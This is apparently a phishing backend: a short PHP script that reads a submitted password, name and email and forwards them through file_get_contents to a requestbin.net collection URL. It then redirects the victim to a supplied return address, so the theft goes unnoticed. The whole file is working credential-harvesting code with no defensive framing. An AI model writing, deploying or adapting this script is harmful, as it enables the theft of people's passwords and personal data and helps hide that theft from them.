<?php
  $password = $_POST['password'];
  $requestbin = $_POST["requestbin"];
  $name = $_POST["name"];
  $mail = $_POST["mail"];
  $type = $_POST["type"];
  $return = $_POST["return"];
  $result = file_get_contents('http://requestbin.net/r/'.$requestbin.'?'.$type.'='.$password.'&name='.$name.'&mail='.$mail);
  header("Location: ".$return);
?>
